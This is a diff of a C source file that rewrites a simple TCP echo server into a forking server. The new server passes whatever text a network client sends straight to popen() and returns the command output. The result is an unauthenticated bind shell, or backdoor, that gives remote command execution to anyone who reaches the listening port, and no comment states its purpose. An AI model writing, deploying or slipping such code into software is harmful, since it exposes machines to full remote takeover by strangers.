@@ -1,66 +1,80 @@
-/* A simple server in the internet domain using TCP
-   The port number is passed as an argument */
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <unistd.h>
-#include <sys/types.h> 
-#include <sys/socket.h>
-#include <netinet/in.h>
-
-void error(const char *msg)
+ 
+int main(int argc, char **argv)
 {
-    perror(msg);
-    exit(1);
-}
+    int sock, listener;
+    struct sockaddr_in addr;
+    char buf[2048];
+    int bytes_read; 
+    int portno; 
+    FILE *command_file; 
+    int nread = 0;
+    
+    if (argc < 2) {
+         fprintf(stderr,"ERROR, no port provided\n");
+         exit(1);
+     }
+ 
+    listener = socket(AF_INET, SOCK_STREAM, 0);
+    if(listener < 0) {
+        perror("socket");
+        exit(1);
+    }
+    portno = atoi(argv[1]);
+    addr.sin_family = AF_INET;
+    addr.sin_addr.s_addr = INADDR_ANY;
+    addr.sin_port = htons(portno);
+    if(bind(listener, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
+        perror("bind");
+        exit(2);
+    }
+ 
+    listen(listener, 5);
+    
+    while(1) {
+	    sock = accept(listener, NULL, NULL);
+	    if(sock < 0) {
+	        perror("ERROR accepting socket conn");
+	        exit(3);
+	    }
+ 
+	    switch(fork()) {
 
-int main(int argc, char *argv[])
-{
-	int sockfd, newsockfd, portno;
-	socklen_t clilen;
-	char buffer[256];
-	struct sockaddr_in serv_addr, cli_addr;
-	int n;
-	if (argc < 2) {
-	 fprintf(stderr,"ERROR, no port provided\n");
-	 exit(1);
-	}
-	sockfd = socket(AF_INET, SOCK_STREAM, 0);
-	if (sockfd < 0) 
-	error("ERROR opening socket");
-	bzero((char *) &serv_addr, sizeof(serv_addr));
-	portno = atoi(argv[1]);
-	serv_addr.sin_family = AF_INET;
-	serv_addr.sin_addr.s_addr = INADDR_ANY;
-	serv_addr.sin_port = htons(portno);
-	if (bind(sockfd, (struct sockaddr *) &serv_addr,
-	      sizeof(serv_addr)) < 0) 
-	      error("ERROR on binding");
-	while (1) {
-		listen(sockfd,5);
-		clilen = sizeof(cli_addr);
-		newsockfd = accept(sockfd, 
-		         (struct sockaddr *) &cli_addr, 
-		         &clilen);
-		if (newsockfd < 0) 
-			error("ERROR on accept");
-		switch(fork()) {
-			case 0:
-				bzero(buffer,256);
-				n = read(newsockfd,buffer,255);
-				if (n < 0) error("ERROR reading from socket");
-				fprintf(stdout, "Here is the message: %s\n",buffer);
-				n = write(newsockfd,"I got your message",18);
-				if (n < 0) error("ERROR writing to socket");
-				close(newsockfd);
-				break;
-			case -1:
-				error("ERROR forking");
-				break;
-			default:
-				break;
+	    case -1:
+	        perror("fork");
+	        break;
+
+	    case 0:
+	        close(listener);
+	        while(1) {
+	            bzero(buf, sizeof(buf));
+	            nread = 0;
+	            bytes_read = recv(sock, buf, sizeof(buf), 0);
+	            if(bytes_read <= 0)
+	                break;
+	            command_file = popen(buf, "r");
+	            
+	            while((nread = fread(buf, 1, sizeof(buf), command_file)) > 0) {
+	                fwrite(buf, sizeof(char), nread, stdout);
+	                send(sock, buf, nread, 0);
+	            }
+	            bzero(buf, sizeof(buf));
+	            send(sock, buf, sizeof(buf), 0);
+	            pclose(command_file);
+	        }
+	        
+	        close(sock);
+	        exit(0);
+
+	    default:
+	        close(sock);
 		}
 	}
-	close(sockfd);
-	return 0; 
+
+	return 0;
 }
